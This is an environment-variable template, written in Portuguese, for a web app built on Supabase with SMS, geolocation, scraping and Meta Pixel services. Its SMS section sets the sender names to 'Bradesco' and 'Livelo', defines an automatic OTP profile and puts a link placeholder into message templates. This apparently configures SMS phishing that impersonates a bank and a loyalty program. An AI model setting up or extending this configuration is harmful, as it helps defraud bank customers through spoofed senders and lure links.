# ── Supabase ──────────────────────────────────────────────────────────────────
# Encontre em: https://supabase.com/dashboard → Settings → API

VITE_SUPABASE_PROJECT_ID=       # Project Reference ID (ex: abcdefghijklmnopqrst)
VITE_SUPABASE_PUBLISHABLE_KEY=  # Anon/public key (JWT)
VITE_SUPABASE_URL=              # ex: https://abcdefghijklmnopqrst.supabase.co
SUPABASE_DB_PASSWORD=           # Senha do banco — Settings → Database → Database password

# ── Cloudflare Turnstile ───────────────────────────────────────────────────────
# Obtenha em: https://dash.cloudflare.com → Turnstile
# Deixe em branco para desabilitar o CAPTCHA

VITE_TURNSTILE_SITE_KEY=        # Site key (frontend, pública)
TURNSTILE_SECRET_KEY=           # Secret key (edge function, privada)

# ── SMS — Risenew ──────────────────────────────────────────────────────────────
# Obtenha em: https://risenew.lat → painel de credenciais
# A URL da API fica hardcoded na edge function enviar-sms/index.ts

# Perfil padrão (OTP automático)
RISENEW_API_KEY=
RISENEW_API_SECRET=
RISENEW_SENDER=                 # nome do sender (ex: Bradesco)

# Perfil alternativo (SMS manual via painel)
RISENEW_API_KEY_2=
RISENEW_API_SECRET_2=
RISENEW_SENDER_2=               # nome do sender alternativo (ex: Livelo)

# Labels exibidos no painel ao selecionar o perfil por template
VITE_SMS_SENDER_1_LABEL=Bradesco
VITE_SMS_SENDER_2_LABEL=Livelo

# Link inserido via placeholder {{link}} nos templates de SMS
VITE_SMS_LINK=

# ── IPInfo ─────────────────────────────────────────────────────────────────────
# Obtenha em: https://ipinfo.io/account/token
IPINFO_TOKEN=

# ── ZenRows ────────────────────────────────────────────────────────────────────
# Obtenha em: https://app.zenrows.com → API Key
ZENROWS_API_KEY=

# ── Meta Pixel + Conversions API ──────────────────────────────────────────────
# Obtenha em: Meta Business Suite → Gerenciador de Eventos → seu pixel
VITE_META_PIXEL_ID=             # ID do pixel (frontend, build-time)
META_PIXEL_ID=                  # ID do pixel (edge function)
META_CAPI_ACCESS_TOKEN=         # Token da CAPI (edge function, privado)

# ==============================================================================
# ATENÇÃO
# Variáveis sem VITE_ são Supabase Secrets — nunca chegam ao bundle JS.
# O painel /admin é protegido por Apache Basic Auth (.htpasswd) — não há
# senha no .env.
# ==============================================================================
